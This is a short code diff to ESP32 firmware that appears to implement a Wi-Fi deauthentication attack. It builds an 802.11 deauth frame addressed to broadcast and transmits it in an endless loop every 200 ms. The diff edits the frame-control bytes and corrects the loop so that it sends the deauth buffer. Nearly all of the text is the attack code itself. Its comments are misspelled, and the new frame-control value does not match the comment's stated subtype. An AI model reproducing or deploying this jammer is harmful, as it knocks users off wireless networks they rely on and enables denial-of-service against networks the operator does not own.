@@ -40,7 +40,7 @@ void sendDeauthPacket(wifi_ap_record_t rec)
 
     // FRAME COTNROL UNSEPORTED PRBLEMS.
     uint8_t deauthPacket[26] = {
-    /*  0 - 1  */ 0x00, 0x0C,                        // type, subtype c0: deauth (a0: disassociate)
+    /*  0 - 1  */ 0x00, 0x00,                        // type, subtype c0: deauth (a0: disassociate)
     /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
     /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // reciever (target)
     /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (ap)
@@ -65,7 +65,7 @@ void sendDeauthPacket(wifi_ap_record_t rec)
             /*56*/  0x04};
 
     while(true){
-        ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_STA, &packet, sizeof(packet), false));
+        ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_STA, &deauthPacket, sizeof(deauthPacket), false));
         vTaskDelay(200 / portTICK_PERIOD_MS);
     }
 }
